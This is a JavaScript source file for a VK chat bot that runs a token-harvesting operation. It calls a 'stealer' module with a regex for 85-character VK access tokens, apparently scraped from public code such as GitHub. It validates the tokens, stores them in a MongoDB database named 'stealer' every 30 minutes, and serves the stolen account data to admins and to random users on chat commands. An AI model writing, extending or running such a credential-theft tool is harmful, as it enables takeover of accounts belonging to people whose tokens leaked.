const { VK } = require('vk-io');
const { HearManager } = require('@vk-io/hear');
const MongoClient = require("mongodb").MongoClient;

const { dbgetcollection, dbgetrandom, dbadd, dbdeleteall } = require("./db.js")
const { get_vk_messages } = require('./vk_handler.js')
const { vk_checker } = require("./vk_checker.js");
const { get_tokens } = require("./stealer.js");


const vk = new VK({
    token: process.env.vktoken
});

const hearManager = new HearManager();

const client = new MongoClient(
    "mongodb://localhost:27017/",
    { useUnifiedTopology: true },
);

const admins = [495643428, 64139266]

vk.updates.on('message_new', hearManager.middleware);

hearManager.hear(/гитхаб все/i, async (context) => {
    client.connect(async function(err, client) {
        let db = client.db("stealer")
        let collection = db.collection("checks");
        if (admins.indexOf(context.senderId) != -1) {
            let checks = await dbgetcollection(collection);
            let messages = await get_vk_messages(checks)
            for (message of messages) {
                context.send({
                    message: message.text,
                    attachment: message.attachment
                })
            }
        } else {
            context.send({
                message: "Вы не админ"
            })
        };
    });
});

hearManager.hear(/гитхаб рандом/i, async (context) => {
    client.connect(async function(err, client) {
        let db = client.db("stealer")
        let collection = db.collection("checks");
        let check = await dbgetrandom(collection)
        let message = await get_vk_messages(check).then(arr => arr[0])
        context.send({
            message: message.text,
            attachment: message.attachment
        })
    })
})

async function dbupdate() {
    client.connect(async function(err, client) {
        const db = client.db("stealer")
        while (true) {
            let collection = db.collection("checks");
            let tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
            let checks = await vk_checker(tokens);
            dbdeleteall(collection)
            dbadd(collection, checks)
            console.log("updated db")
            await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
        };
    });
};

dbupdate();
vk.updates.start().catch(console.error);